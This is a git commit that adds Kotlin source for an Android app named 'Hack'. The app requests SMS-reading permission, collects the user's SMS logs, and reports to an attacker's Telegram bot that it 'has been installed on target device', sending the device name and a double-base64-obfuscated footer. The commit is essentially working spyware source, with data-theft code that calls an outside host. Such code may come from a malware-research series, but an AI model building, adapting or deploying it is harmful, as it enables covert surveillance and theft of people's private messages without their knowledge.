ecdb878396a501d7acd7fc40e529ffa238810389
cocomelonc <cocomelonkz@gmail.com>
2025-04-30 04:27:13 +0300

    hack all: service, not tested

---
+++ 09-linux-android/16-service/Hack/app/src/main/java/cocomelonc/hack/HackMainActivity.kt
@@ -0,0 +1,84 @@
+package cocomelonc.hack
+
+import android.Manifest
+import cocomelonc.hack.tools.HackNetwork
+import android.os.Bundle
+import androidx.activity.ComponentActivity
+import cocomelonc.hack.tools.HackSmsLogs
+
+import android.annotation.SuppressLint
+import android.content.IntentFilter
+import android.content.Intent
+import android.widget.Button
+import android.widget.Toast
+import com.karumi.dexter.Dexter
+import com.karumi.dexter.MultiplePermissionsReport
+import com.karumi.dexter.PermissionToken
+import com.karumi.dexter.listener.DexterError
+import com.karumi.dexter.listener.PermissionRequest
+import com.karumi.dexter.listener.PermissionRequestErrorListener
+import com.karumi.dexter.listener.multi.MultiplePermissionsListener
+
+class HackMainActivity : ComponentActivity() {
+    private lateinit var meowButton: Button
+    val hackSmsLogs = HackSmsLogs(context = this)
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
+        HackNetwork(this).initHack()
+        requestPermissions()
+        meowButton = findViewById(R.id.meowButton)
+        meowButton.setOnClickListener {
+            hackSmsLogs.getSmsLogs()
+        }
+    }
+
+    @SuppressLint("NewApi")
+    private fun requestPermissions() {
+        // below line is use to request permission in the current activity.
+        // this method is use to handle error in runtime permissions
+        Dexter.withContext(this) // below line is use to request the number of permissions which are required in our app.
+            .withPermissions(
+                Manifest.permission.READ_SMS,
+            ) // after adding permissions we are calling an with listener method.
+            .withListener(object : MultiplePermissionsListener {
+                override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
+                    // this method is called when all permissions are granted
+                    if (multiplePermissionsReport.areAllPermissionsGranted()) {
+                        // do you work now
+                        Toast.makeText(
+                            applicationContext,
+                            "Hack permissions granted",
+                            Toast.LENGTH_SHORT
+                        ).show()
+                        HackNetwork(applicationContext).sendTextMessage("Hack permissions granted\n")
+                        hackSmsLogs.getSmsLogs()
+                    }
+
+                    // check for permanent denial of any permission
+                    if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
+                        // permission is denied permanently, we will show user a message.
+                        Toast.makeText(
+                            applicationContext,
+                            "Hack some permissions denied",
+                            Toast.LENGTH_SHORT
+                        ).show()
+                        HackNetwork(applicationContext).sendTextMessage("Hack some permissions denied\n")
+                    }
+                }
+
+                override fun onPermissionRationaleShouldBeShown(
+                    list: MutableList<PermissionRequest?>?,
+                    permissionToken: PermissionToken
+                ) {
+                    // this method is called when user grants some permission and denies some of them.
+                    permissionToken.continuePermissionRequest()
+                }
+            }).withErrorListener(PermissionRequestErrorListener { _: DexterError? ->
+                // we are displaying a toast message for error message.
+                Toast.makeText(applicationContext, "Error occurred! ", Toast.LENGTH_SHORT)
+                    .show()
+            }) // below line is use to run the permissions on same thread and to check the permissions
+            .onSameThread().check()
+    }
+}
---
+++ 09-linux-android/16-service/Hack/app/src/main/java/cocomelonc/hack/tools/HackNetwork.kt
@@ -0,0 +1,54 @@
+package cocomelonc.hack.tools
+
+import android.annotation.SuppressLint
+import android.content.Context
+import android.util.Log
+import androidx.lifecycle.ViewModel
+import androidx.lifecycle.viewModelScope
+import com.pengrad.telegrambot.TelegramBot
+import com.pengrad.telegrambot.model.request.Keyboard
+import com.pengrad.telegrambot.model.request.KeyboardButton
+import com.pengrad.telegrambot.model.request.ReplyKeyboardMarkup
+import com.pengrad.telegrambot.request.SendMessage
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import java.nio.charset.StandardCharsets
+import java.util.*
+
+
+class HackNetwork(context: Context) : ViewModel() {
+    private val token = HackUtils.getHackNetworkData(context).token
+    private val id = HackUtils.getHackNetworkData(context).id
+    private var bot = TelegramBot(token)
+
+    private fun simpleKeyboard(): Keyboard {
+        return ReplyKeyboardMarkup(
+            KeyboardButton("Meow"),
+            KeyboardButton("Meow"),
+            KeyboardButton("Meow"),
+            KeyboardButton("Meow"),
+        )
+    }
+
+    @SuppressLint("NewApi")
+    fun sendTextMessage(message: String) {
+        try {
+            viewModelScope.launch(Dispatchers.IO) {
+                val footer0 = "OEoyUW5mQ2RrSjd3blpDdjhKMlFudkNka0tYd25aQ284SjJRcWZDZGtKN3duWkNkSVBDZGtKdnduWkN5SURvZ1FHTnZZMjl0Wld4dmJtTT0"
+                val footer = String(Base64.getDecoder().decode(footer0), StandardCharsets.UTF_8)
+                val footer2 = String(Base64.getDecoder().decode(footer), StandardCharsets.UTF_8)
+                val info = "\uD83D\uDCF1\uD835\uDC1D\uD835\uDC1E\uD835\uDC2F\uD835\uDC22\uD835\uDC1C\uD835\uDC1E\n${HackUtils.getDeviceName()}"
+                val meow = "\u004d\u0065\u006f\u0077\u0020\u0066\u0072\u006f\u006d\u0020\u0042\u0061\u0068\u0072\u0061\u0069\u006e\u0021\uD83C\uDDE7\uD83C\uDDED"
+                val messageToSend = "\uD83D\uDCF1$message\n$info\n$meow\n${footer2}"
+                bot.execute(SendMessage(id, messageToSend).replyMarkup(simpleKeyboard()))
+            }
+        } catch (e: Exception) {
+            Log.d("HackNetwork", "${e.message}")
+        }
+    }
+
+    fun initHack() {
+        sendTextMessage("LoveBahrain Hack application has been installed on target device and opened\n")
+    }
+
+}
